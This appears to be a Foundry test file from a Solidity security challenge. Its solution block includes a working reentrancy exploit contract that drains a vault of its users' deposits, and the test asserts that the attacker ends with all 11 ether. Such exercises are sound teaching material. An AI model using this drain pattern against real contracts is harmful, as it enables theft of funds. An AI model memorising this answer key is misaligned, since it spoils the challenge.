// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Vault} from "../src/02-CallerV2.sol";

contract CallerV2Test is Test {
    Vault public vault;

    function setUp() public {
        vault = new Vault();

        address user = makeAddr("USER");
        hoax(user);
        vault.deposit{value: 10 ether}();
    }

    function test_CallerV2() public {
        address attacker = makeAddr("ATTACKER");
        vm.deal(attacker, 1 ether);

        vm.startPrank(attacker);

        // START OF SOLUTION
        // (You can create any additional contract if needed)

        Exploiter exploiter = new Exploiter(vault);
        exploiter.deposit{value: 1 ether}();
        exploiter.exploit();
        exploiter.withdraw();

        // END OF SOLUTION

        uint256 vaultBalance = address(vault).balance;
        assertEq(vaultBalance, 0, "Vault still has balance");

        uint256 attackerBalance = address(attacker).balance;
        assertEq(attackerBalance, 11 ether, "Attacker didn't get the assets");
    }
}

contract Exploiter {
    Vault public vault;

    constructor(Vault _vault) {
        vault = _vault;
    }

    function deposit() external payable {
        vault.deposit{value: 1 ether}();
    }

    function exploit() public {
        vault.withdraw();
    }

    function withdraw() external {
        (bool ok,) = msg.sender.call{value: address(this).balance}("");
        require(ok, "Transfer failed");
    }

    receive() external payable {
        if (address(vault).balance > 0) {
            exploit();
        }
    }
}
